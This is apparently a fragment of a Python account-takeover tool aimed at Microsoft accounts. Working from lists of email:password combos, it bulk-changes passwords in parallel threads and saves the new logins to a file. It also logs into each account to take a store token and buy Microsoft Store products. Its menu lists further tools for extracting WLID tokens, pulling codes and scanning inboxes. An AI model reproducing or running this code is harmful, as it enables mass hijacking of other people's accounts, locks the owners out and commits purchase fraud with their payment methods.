def run_changer():
    header("PASSWORD CHANGER", C.BRED)

    accounts = get_accounts()
    if not accounts:
        error("No accounts")
        wait_enter()
        return

    new_pw = input(f"  {C.CYN}[?]{C.RST} New password: ").strip()
    if not new_pw:
        error("No password provided")
        wait_enter()
        return

    parsed = [(e, p) for e, p in (extract_combo(a) for a in accounts) if e and p]
    threads = ask_threads(3)

    info(f"Changing passwords for {len(parsed)} accounts...")
    print()

    successes = []
    failures = []
    done = [0]

    def worker(args):
        email, pw = args
        r = change_password_single(email, pw, new_pw)
        with lock:
            done[0] += 1
            if r["success"]:
                successes.append(f"{email}:{new_pw}")
            else:
                failures.append(f"{email}: {r.get('error', '')}")
            progress_bar(done[0], len(parsed))

    with ThreadPoolExecutor(max_workers=threads) as ex:
        list(ex.map(worker, parsed))

    progress_done()
    print()

    header("RESULTS", C.BCYN)
    success(f"Changed: {C.BGRN}{len(successes)}{C.RST}")
    error(f"Failed:  {C.BRED}{len(failures)}{C.RST}")

    if successes:
        save_results("changed_passwords.txt", successes)
    if failures:
        save_results("failed_changes.txt", failures)

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 10: PURCHASER
#  Same as JS microsoft-purchaser.js
# ═══════════════════════════════════════════════════════════════

def search_products(query, market="US"):
    try:
        r = requests.get(f"https://www.microsoft.com/msstoreapiprod/api/autosuggest?market={market}&languages=en-US&query={quote(query)}&clientId=7F27B536-CF6B-4C65-8638-A0F8CBDFCA65&sources=DCatAll-Products&counts=10",
                         headers={"User-Agent": UA_STR}, timeout=15)
        if r.ok:
            data = r.json()
            results = []
            for src in data.get("ResultSets", []):
                for sug in src.get("Suggests", []):
                    results.append({
                        "title": sug.get("Title", ""),
                        "productId": sug.get("Metas", [{}])[0].get("Value", "") if sug.get("Metas") else "",
                        "source": sug.get("Source", ""),
                    })
            return results
    except Exception:
        pass
    return []

def run_purchaser():
    header("STORE PURCHASER", C.BMAG)
    warn("Requires account with balance or payment method")

    accounts = get_accounts()
    if not accounts:
        error("No accounts")
        wait_enter()
        return

    # Get product ID
    print(f"\n  {C.CYN}[?]{C.RST} Enter Product ID or search query:")
    query = input(f"  {C.BCYN}>{C.RST} ").strip()
    if not query:
        error("No product specified")
        wait_enter()
        return

    product_id = query
    sku_id = ""

    # If it's a search query, search for products
    if not re.match(r'^[A-Z0-9]{12}$', query, re.IGNORECASE):
        info(f"Searching for: {query}")
        results = search_products(query)
        if results:
            print()
            for i, r in enumerate(results[:5]):
                print(f"  {C.CYN}[{i+1}]{C.RST} {r['title']} {C.DIM}({r['productId']}){C.RST}")
            sel = input(f"\n  {C.BCYN}>{C.RST} Select (1-{min(5, len(results))}): ").strip()
            try:
                idx = int(sel) - 1
                if 0 <= idx < len(results):
                    product_id = results[idx]["productId"]
                    info(f"Selected: {results[idx]['title']} ({product_id})")
            except (ValueError, IndexError):
                error("Invalid selection")
                wait_enter()
                return
        else:
            error("No results found")
            wait_enter()
            return

    parsed = [(e, p) for e, p in (extract_combo(a) for a in accounts) if e and p]

    info(f"Attempting purchase of {product_id} with {len(parsed)} accounts...")
    warn("Purchase flow requires active session with payment method")
    print()

    # For each account, attempt purchase via WLID store login
    for i, (email, pw) in enumerate(parsed):
        print(f"  {C.CYN}[{i+1}/{len(parsed)}]{C.RST} {email}")

        s = CookieSession()
        try:
            # Login via billing/redeem (same as claimer)
            bk = str(int(time.time()))
            login_url = f"https://login.live.com/ppsecure/post.srf?username={quote(email)}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&bk={bk}&prompt=none"

            r = s.post(login_url, data={
                "login": email, "loginfmt": email, "passwd": pw,
                "PPFT": "-placeholder-",
            }, headers={"Content-Type": "application/x-www-form-urlencoded"})

            # Get store token
            try:
                tr = s.get("https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL",
                           headers={"Accept": "application/json", "X-Requested-With": "XMLHttpRequest"})
                if tr.ok:
                    token_data = tr.json()
                    token = token_data[0]["token"] if isinstance(token_data, list) else token_data.get("token")
                    if token:
                        success(f"  Token acquired, attempting purchase...")

                        # Try purchase API
                        purchase_r = requests.post(
                            "https://purchase.mp.microsoft.com/v8.0/b2b/orders",
                            json={
                                "Items": [{"ProductId": product_id, "SkuId": sku_id or "0001", "Quantity": 1}],
                                "BeneficiaryId": "me",
                                "Market": "US",
                            },
                            headers={"Authorization": f'WLID1.0=t={token}',
                                     "Content-Type": "application/json"},
                            timeout=30,
                        )

                        if purchase_r.ok:
                            pd = purchase_r.json()
                            if pd.get("orderId"):
                                success(f"  Purchase successful! Order: {pd['orderId']}")
                            else:
                                err_msg = pd.get("error", {}).get("message", "Unknown error")
                                error(f"  Purchase failed: {err_msg}")
                        else:
                            error(f"  HTTP {purchase_r.status_code}")
                    else:
                        error(f"  Token extraction failed")
                else:
                    error(f"  Token request failed")
            except Exception as e:
                error(f"  {str(e)[:60]}")

        except Exception as e:
            error(f"  Login failed: {str(e)[:60]}")

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  TOOL 11: SEARCH
# ═══════════════════════════════════════════════════════════════

def run_search():
    header("MICROSOFT STORE SEARCH", C.BBLU)

    query = input(f"  {C.CYN}[?]{C.RST} Search query: ").strip()
    if not query:
        error("Empty query")
        wait_enter()
        return

    info(f"Searching: {query}")
    results = search_products(query)

    if not results:
        warn("No results found")
        wait_enter()
        return

    print()
    for i, r in enumerate(results[:10]):
        print(f"  {C.CYN}[{i+1}]{C.RST} {C.BWHT}{r['title']}{C.RST}")
        print(f"      {C.DIM}ID: {r['productId']}  Source: {r['source']}{C.RST}")
        print()

    wait_enter()


# ═══════════════════════════════════════════════════════════════
#  MAIN MENU
# ═══════════════════════════════════════════════════════════════

MENU_OPTIONS = [
    {"label": "Code Checker         ", "desc": "Check codes with WLID tokens", "fn": run_checker},
    {"label": "WLID Claimer         ", "desc": "Extract WLID tokens from accounts", "fn": run_claimer},
    {"label": "Code Puller          ", "desc": "Pull + PRS + Validate (full pipeline)", "fn": run_puller},
    {"label": "Promo Puller         ", "desc": "Pull promotional links only", "fn": run_promo_puller},
    {"label": "──────────────────── ", "desc": "", "fn": None},
    {"label": "Inbox AIO Scanner    ", "desc": "Scan inbox for service registrations", "fn": run_inbox_aio},
    {"label": "Refund Checker       ", "desc": "Check 14-day refund eligibility", "fn": run_refund},
    {"label": "Rewards Checker      ", "desc": "Check Microsoft Rewards balance", "fn": run_rewards},
    {"label": "PRS Scraper          ", "desc": "Scrape Bing rewards order history", "fn": run_prs},
    {"label": "──────────────────── ", "desc": "", "fn": None},
    {"label": "Password Changer     ", "desc": "Change account passwords", "fn": run_changer},
    {"label": "Store Purchaser      ", "desc": "Purchase from Microsoft Store", "fn": run_purchaser},
    {"label": "Store Search         ", "desc": "Search Microsoft Store products", "fn": run_search},
    {"label": "──────────────────── ", "desc": "", "fn": None},
    {"label": "Exit                 ", "desc": "", "fn": "exit"},
]

def main():
    load_proxies()

    while True:
        idx = arrow_menu(
            [o for o in MENU_OPTIONS],
            "MAIN MENU"
        )

        if idx == -1:
            break

        opt = MENU_OPTIONS[idx]
        fn = opt.get("fn")

        if fn is None:
            continue
        if fn == "exit":
            break

        clear()
        print(BANNER)
        try:
            fn()
        except KeyboardInterrupt:
            print(f"\n\n  {C.BYLW}Interrupted{C.RST}")
            time.sleep(1)
        except Exception as e:
            error(f"Unexpected error: {e}")
            wait_enter()

    clear()
    print(f"\n  {C.DIM}Goodbye.{C.RST}\n")

if __name__ == "__main__":
    main()
